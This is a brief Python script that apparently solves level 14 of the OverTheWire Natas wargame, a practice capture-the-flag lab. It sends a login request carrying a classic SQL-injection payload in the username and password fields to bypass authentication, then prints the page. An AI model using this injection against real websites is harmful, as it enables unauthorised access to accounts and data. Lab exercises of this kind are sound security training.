#!/usr/bin/env python

import requests

URL = 'http://natas14.natas.labs.overthewire.org/index.php'
USERNAME = 'natas14'
PASSWORD = 'xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx'
KEY = ''

ADDON = '?username=a" or "a"="a&password=a" or "a"="a'
r = requests.get(URL+ADDON, auth=(USERNAME, PASSWORD))
print(r.text)
